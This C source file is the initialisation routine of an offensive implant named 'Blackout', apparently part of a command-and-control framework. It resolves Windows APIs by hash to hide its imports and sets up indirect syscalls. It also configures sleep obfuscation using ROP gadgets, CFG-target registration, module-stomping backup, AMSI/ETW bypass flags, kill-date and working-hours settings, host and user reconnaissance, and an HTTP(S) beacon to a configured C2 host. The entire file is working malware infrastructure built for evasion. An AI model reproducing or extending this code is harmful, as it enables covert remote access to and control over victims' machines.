#include <common.h>
#include <utils.h>
#include <constexpr.h>
#include <evasion.h>

FUNC VOID BlackoutInit( 
    PVOID Param
 ) {
    BLACKOUT_INSTANCE

    Instance()->Teb = NtCurrentTeb();

    Instance()->Modules.Kernel32   = LdrLoadModule( HASH_STR( "KERNEL32.DLL" ) );
    Instance()->Modules.Kernelbase = LdrLoadModule( HASH_STR( "KERNELBASE.dll" ) );
    Instance()->Modules.Ntdll      = LdrLoadModule( HASH_STR( "ntdll.dll" ) );

    Win32().LoadLibraryA   = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
    Win32().GetProcAddress = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );

    Win32().GetModuleHandleA          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetModuleHandleA" ) );
    Win32().CreateTimerQueueTimer     = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateTimerQueueTimer" ) );
    Win32().OpenProcess               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "OpenProcess" ) );
    Win32().OpenThread                = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "OpenThread" ) );
    Win32().CreateProcessA            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessA" ) );
    Win32().CreateProcessW            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessW" ) );
    Win32().CreateProcessAsUserA      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserA" ) );
    Win32().CreateProcessAsUserW      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserW" ) );
    Win32().CreateProcessWithLogonW   = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithLogonW" ) );
    Win32().CreateProcessWithTokenW   = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithTokenW" ) );
    Win32().WaitForDebugEvent         = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WaitForDebugEvent" ) );
    Win32().WriteProcessMemory        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WriteProcessMemory" ) );
    Win32().DebugActiveProcessStop    = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "DebugActiveProcessStop" ) );
    Win32().ContinueDebugEvent        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ContinueDebugEvent" ) );
    Win32().FreeLibrary               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "FreeLibrary" ) );
    Win32().CloseHandle               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CloseHandle" ) );
    Win32().GetLastError              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetLastError" ) );
    Win32().LocalAlloc                = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LocalAlloc" ) );
    Win32().LocalFree                 = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LocalFree" ) );
    Win32().LocalReAlloc              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LocalReAlloc" ) );
    Win32().VirtualFree               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) );
    Win32().VirtualQuery              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualQuery" ) );
    Win32().VirtualQueryEx            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualQueryEx" ) );
    Win32().VirtualAlloc              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) );
    Win32().VirtualAllocEx            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualAllocEx" ) );
    Win32().VirtualProtect            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) );
    Win32().VirtualProtectEx          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtectEx" ) );
    Win32().WaitForSingleObject       = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) );
    Win32().WaitForSingleObjectEx     = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) );
    Win32().HeapWalk                  = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "HeapWalk" ) );
    Win32().CreatePipe                = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreatePipe" ) );
    Win32().CreateNamedPipeA          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeA" ) );
    Win32().CreateNamedPipeW          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeW" ) );
    Win32().ConnectNamedPipe          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ConnectNamedPipe" ) );
    Win32().CreateMailslotA           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotA" ) );
    Win32().CreateMailslotW           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotW" ) );
    Win32().CreateFileA               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateFileA" ) );
    Win32().CreateFileW               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateFileW" ) );
    Win32().ReadFile                  = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ReadFile" ) );
    Win32().FormatMessageA            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "FormatMessageA" ) );
    Win32().GetCurrentDirectoryA      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetCurrentDirectoryA" ) );
    Win32().SetCurrentDirectoryA      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SetCurrentDirectoryA" ) );
    Win32().CreateThread              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
    Win32().CreateRemoteThread        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
    Win32().QueueUserAPC              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "QueueUserAPC" ) ); 
    Win32().GetTickCount              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetTickCount" ) );
    Win32().GetComputerNameExA        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetComputerNameExA" ) );
    Win32().TerminateProcess          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "TerminateProcess" ) );
    Win32().GetProductInfo            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetProductInfo" ) );
    Win32().GetNativeSystemInfo       = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetNativeSystemInfo" )  );
    Win32().DuplicateHandle           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "DuplicateHandle" )  );
    Win32().GetThreadId               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetThreadId" )  );
    Win32().ResumeThread              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ResumeThread" )  );
    Win32().SuspendThread             = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SuspendThread" )  );
    Win32().GetMappedFileNameA        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetMappedFileNameA" )  );
    Win32().TerminateThread           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "TerminateThread" )  );
    Win32().SetFileInformationByHandle= LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SetFileInformationByHandle" )  );
    Win32().LoadLibraryExA            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExA" )  );
    Win32().LoadLibraryExW            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW" )  );
    Win32().SetEvent                  = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SetEvent" )  );
    Win32().ReadProcessMemory         = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ReadProcessMemory" )  );
    Win32().InitializeProcThreadAttributeList = Win32().GetProcAddress( Instance()->Modules.Kernelbase, "InitializeProcThreadAttributeList"   );
    Win32().UpdateProcThreadAttribute         = Win32().GetProcAddress( Instance()->Modules.Kernelbase, "UpdateProcThreadAttribute"   );
    Win32().DeleteProcThreadAttributeList     = Win32().GetProcAddress( Instance()->Modules.Kernelbase, "DeleteProcThreadAttributeList"  );
    Win32().RtlCaptureContext                 = Win32().GetProcAddress( Instance()->Modules.Kernel32, "RtlCaptureContext" );


    Win32().RtlDeleteTimer            = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteTimer" ) );
    Win32().RtlDeleteTimerQueue       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteTimerQueue" ) );
    Win32().RtlDeleteCriticalSection     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteCriticalSection" )  );
    Win32().RtlInitializeCriticalSection = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlInitializeCriticalSection" )  );
    Win32().RtlCompareMemory          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCompareMemory" )  );
    Win32()._RtlCopyMemory             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCopyMemory" )  );
    Win32().RtlExitUserProcess        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
    Win32().RtlExitUserThread         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
    Win32().RtlAllocateHeap           = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAllocateHeap" ) );
    Win32().RtlReAllocateHeap         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlReAllocateHeap" ) );
    Win32().RtlFreeHeap               = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlFreeHeap" ) );

    Win32().NtUnmapViewOfSection      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtUnmapViewOfSection" ) );
    Win32().NtMapViewOfSection        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtMapViewOfSection" ) );
    Win32().NtCreateSection           = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateSection" ) );
    Win32().TpReleaseCleanupGroupMembers = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "TpReleaseCleanupGroupMembers" ) );
    Win32().NtFreeVirtualMemory       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtFreeVirtualMemory" )  );
    Win32().RtlCreateTimer            = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimer" ) );
    Win32().RtlRandomEx               = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlRandomEx" ) );
    Win32().RtlGetVersion             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlGetVersion" ));
    Win32().RtlIpv6StringToAddressA   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlIpv6StringToAddressA" ) );
    Win32().NtAllocateVirtualMemory   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) );
    Win32().NtProtectVirtualMemory    = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
    Win32().NtCreateThreadEx          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Win32().LdrLoadDll                = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
    Win32().LdrUnloadDll              = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "LdrUnloadDll" ) );
    Win32().NtGetNextProcess          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtGetNextProcess" ) );

    Win32().NtQuerySystemInformation  = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
    Win32().NtQueryInformationProcess = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationProcess" ) );
    Win32().NtQueryVirtualMemory      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryVirtualMemory" ) );
    Win32().NtQueryInformationToken   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationToken" ) );
    Win32().NtQueryInformationThread  = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationThread" ) );
    Win32().NtSetInformationVirtualMemory = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
    
    Win32().RtlAddVectoredContinueHandler      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredContinueHandler" ) );
    Win32().RtlAddVectoredExceptionHandler     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredExceptionHandler" ) );
    Win32().RtlRemoveVectoredContinueHandler   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredContinueHandler" ) );
    Win32().RtlRemoveVectoredExceptionHandler  = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredExceptionHandler" ) );

    Win32().RtlCreateTimerQueue       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimerQueue" ) );
    Win32().NtAlertResumeThread       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
    Win32().NtContinue                = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
    Win32().NtCreateEvent             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
    Win32().NtCreateThreadEx          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Win32().NtQueueApcThread          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueueApcThread" ) );
    Win32().NtGetContextThread        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtGetContextThread" ) );
    Win32().NtSetContextThread        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSetContextThread" ) );
    Win32().NtTestAlert               = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtTestAlert" ) );
    Win32().NtWaitForSingleObject     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
    Win32().NtSignalAndWaitForSingleObject = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );
    Win32().NtCreateFile              = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateFile" ) );
    Win32().NtCreateNamedPipeFile     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateNamedPipeFile" ) );   
    Win32().NtWriteVirtualMemory      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtWriteVirtualMemory" ) ); 
    Win32().NtOpenProcess             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcess" ) ); 
    Win32().NtResumeThread            = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtResumeThread" ) ); 
    Win32().NtSuspendThread           = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendThread" ) ); 
    Win32().NtSuspendProcess          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendProcess" ) ); 
    Win32().NtTerminateThread         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtTerminateThread" ) ); 
    Win32().NtOpenProcessToken        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcessToken" ) ); 
    Win32().NtOpenProcessTokenEx      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcessTokenEx" ) ); 
    Win32().NtOpenThreadToken         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadToken" ) ); 
    Win32().NtOpenThreadTokenEx       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadTokenEx" ) ); 
    Win32().NtFlushInstructionCache   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtFlushInstructionCache" ) ); 
    Win32().RtlAddFunctionTable       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAddFunctionTable" ) );

    Instance()->Modules.Winhttp   = LdrLoadModule( HASH_STR( "Winhttp.dll" ) );
    Instance()->Modules.Advapi32  = LdrLoadModule( HASH_STR( "Advapi32.dll" ) );
    Instance()->Modules.Msvcrt    = LdrLoadModule( HASH_STR( "msvcrt.dll" ) );
    Instance()->Modules.Cryptbase = LdrLoadModule( HASH_STR( "Cryptbase.dll" ) ); 
    Instance()->Modules.Iphlpapi  = LdrLoadModule( HASH_STR( "IPHLPAPI.DLL" ) );

    if ( !Instance()->Modules.Winhttp   ) Instance()->Modules.Winhttp   = LdrLoadLib( L"Winhttp.dll"   );
    if ( !Instance()->Modules.Advapi32  ) Instance()->Modules.Advapi32  = LdrLoadLib( L"Advapi32.dll"  );
    if ( !Instance()->Modules.Msvcrt    ) Instance()->Modules.Msvcrt    = LdrLoadLib( L"Msvcrt.dll"    );
    if ( !Instance()->Modules.Cryptbase ) Instance()->Modules.Cryptbase = LdrLoadLib( L"Cryptbase.dll" );
    if ( !Instance()->Modules.Iphlpapi  ) Instance()->Modules.Iphlpapi  = LdrLoadLib( L"Iphlpapi.dll"  );

    Win32().AdjustTokenPrivileges = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "AdjustTokenPrivileges" ) );
    Win32().LookupPrivilegeValueA = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "LookupPrivilegeValueA" ) );
    Win32().LookupAccountSidA     = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "LookupAccountSidA" ) );
    Win32().GetUserNameA          = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "GetUserNameA" ) );
    Win32().OpenProcessToken      = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "OpenProcessToken" ) );
    Win32().OpenThreadToken       = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "OpenThreadToken" ) );
    Win32().DuplicateToken        = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "DuplicateToken" ) );

    Win32().WinHttpOpen               = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpen" ) );
    Win32().WinHttpConnect            = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpConnect" ) );
    Win32().WinHttpOpenRequest        = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpenRequest" ) );
    Win32().WinHttpReceiveResponse    = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReceiveResponse" ) );
    Win32().WinHttpSendRequest        = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSendRequest" ) );
    Win32().WinHttpReadData           = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReadData" ) );
    Win32().WinHttpSetOption          = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSetOption") );
    Win32().WinHttpCloseHandle        = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpCloseHandle" ) );

    Win32().SystemFunction040 = LdrLoadFunc( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction040" ) );
    Win32().SystemFunction041 = LdrLoadFunc( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction041" ) );

    Win32().GetAdaptersInfo = LdrLoadFunc( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );

    Win32().printf  = LdrLoadFunc( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );
    Win32().strncmp = LdrLoadFunc( Instance()->Modules.Msvcrt, HASH_STR( "strncmp" ) );
    Win32().vprintf = LdrLoadFunc( Instance()->Modules.Msvcrt, HASH_STR( "vprintf" ) );

    /*=============================[ init syscall config ]=============================*/

    InitNtdllConf();

    FetchNtSyscall(HASH_STR( "NtAllocateVirtualMemory"), &Syscall().SysTable.NtAllocateVirtualMemory);
    FetchNtSyscall(HASH_STR( "NtProtectVirtualMemory" ), &Syscall().SysTable.NtProtectVirtualMemory);
    FetchNtSyscall(HASH_STR( "NtWriteVirtualMemory"   ), &Syscall().SysTable.NtWriteVirtualMemory);
    FetchNtSyscall(HASH_STR( "NtOpenProcess"          ), &Syscall().SysTable.NtOpenProcess);
    FetchNtSyscall(HASH_STR( "NtOpenThread"           ), &Syscall().SysTable.NtOpenThread);
    FetchNtSyscall(HASH_STR( "NtOpenThreadToken"      ), &Syscall().SysTable.NtOpenThreadToken);
    FetchNtSyscall(HASH_STR( "NtOpenProcessToken"     ), &Syscall().SysTable.NtOpenProcessToken);
    FetchNtSyscall(HASH_STR( "NtClose"                ), &Syscall().SysTable.NtClose);
    FetchNtSyscall(HASH_STR( "NtQueryVirtualMemory"   ), &Syscall().SysTable.NtQueryVirtualMemory);
    FetchNtSyscall(HASH_STR( "NtFreeVirtualMemory"    ), &Syscall().SysTable.NtFreeVirtualMemory);
    FetchNtSyscall(HASH_STR( "NtCreateThreadEx"       ), &Syscall().SysTable.NtCreateThreadEx);
    FetchNtSyscall(HASH_STR( "NtTerminateThread"      ), &Syscall().SysTable.NtTerminateThread);
    FetchNtSyscall(HASH_STR( "NtTerminateProcess"     ), &Syscall().SysTable.NtTerminateProcess);
    FetchNtSyscall(HASH_STR( "NtSuspendThread"        ), &Syscall().SysTable.NtSuspendThread);
    FetchNtSyscall(HASH_STR( "NtResumeThread"         ), &Syscall().SysTable.NtResumeThread);
    FetchNtSyscall(HASH_STR( "NtCreateFile"           ), &Syscall().SysTable.NtCreateFile);
    FetchNtSyscall(HASH_STR( "NtWriteFile"            ), &Syscall().SysTable.NtWriteFile);
    FetchNtSyscall(HASH_STR( "NtCreateSection"        ), &Syscall().SysTable.NtCreateSection);
    FetchNtSyscall(HASH_STR( "NtMapViewOfSection"     ), &Syscall().SysTable.NtMapViewOfSection);
    FetchNtSyscall(HASH_STR( "NtUnmapViewOfSection"   ), &Syscall().SysTable.NtUnmapViewOfSection);
    FetchNtSyscall(HASH_STR( "NtGetContextThread"     ), &Syscall().SysTable.NtGetContextThread);
    FetchNtSyscall(HASH_STR( "NtSetContextThread"     ), &Syscall().SysTable.NtSetContextThread);
    FetchNtSyscall(HASH_STR( "NtWaitForSingleObject"  ), &Syscall().SysTable.NtWaitForSingleObject);
    FetchNtSyscall(HASH_STR( "NtQueueApcThread"       ), &Syscall().SysTable.NtQueueApcThread);

    /*============================[ Agent config initialization ]============================*/

#ifdef BK_STOMP
    CreateImplantBackup();
#endif

    Blackout().bkApi                     = _BK_API_;
    Blackout().SleepObf.Technique        = _BK_SLEEP_OBF_; 
    Blackout().SleepObf.NtContinueGadget = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "LdrInitializeThunk" ) ) + 19;
    Blackout().SleepObf.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, RBX_REG );
    Instance()->Session.WorkingHours     = CONFIG_WRKHRS;
    Instance()->Session.KillDate         = CONFIG_KILLDATE;
    Instance()->Session.SleepTime        = CONFIG_SLEEP;
    Instance()->Session.Jitter           = 0x00;
    Instance()->Session.AgentId          = RandomNumber32();
    Blackout().AmsiBypass                = FALSE;
    Blackout().EtwBypass                 = FALSE;
    Instance()->Session.ProcessId        = U_32( Instance()->Teb->ClientId.UniqueProcess );
    Instance()->Session.ThreadId         = U_32( Instance()->Teb->ClientId.UniqueThread );

    /*============================[ Machine recognition ]============================*/

    Instance()->System.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;

    GetComputerInfo( 
        &Instance()->System.OsArch,
        &Instance()->System.ProcessorType,
        &Instance()->System.ProductType,
        &Instance()->System.IpAddress
    );
    
    BK_PRINT( "%s %s %s %s\n",         
        Instance()->System.ComputerName,
        Instance()->System.NetBios,
        Instance()->System.DomainName,
        Instance()->System.UserName 
    );

    /*============================[ Http/s listener config ]============================*/

    Transport().Http.Host      = bkHeapAlloc( MAX_PATH * 2 );
    Transport().Http.UserAgent = bkHeapAlloc( MAX_PATH * 2 );
    Transport().Http.Port      = CONFIG_PORT;
    Transport().Http.Secure    = CONFIG_SECURE;

    MmCopy( Transport().Http.Host,      CONFIG_HOST,      sizeof( CONFIG_HOST      ) );
    MmCopy( Transport().Http.UserAgent, CONFIG_USERAGENT, sizeof( CONFIG_USERAGENT ) );

    /*============================[ Process Informations ]============================*/

    GetProcessInfo( 
        &Instance()->Session.ProcessFullPath, 
        &Instance()->Session.ProcessName, 
        &Instance()->Session.ProcessCmdLine,
        &Instance()->Session.Protected,
        &Instance()->Session.ParentProcId
    );

    /*============================[ CFG Routine to SleepObf ]============================*/

    if ( CfgCheckEnabled() ) {
        CfgAddressAdd( Instance()->Modules.Kernel32,  Win32().VirtualProtect );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Win32().SystemFunction040  );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Win32().SystemFunction041  );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32()._RtlCopyMemory );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().NtContinue );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().NtSetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().NtGetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().NtTestAlert );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().NtWaitForSingleObject );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().RtlExitUserThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().NtProtectVirtualMemory );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().RtlCreateTimer );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Win32().RtlCreateTimerQueue );
    }
}
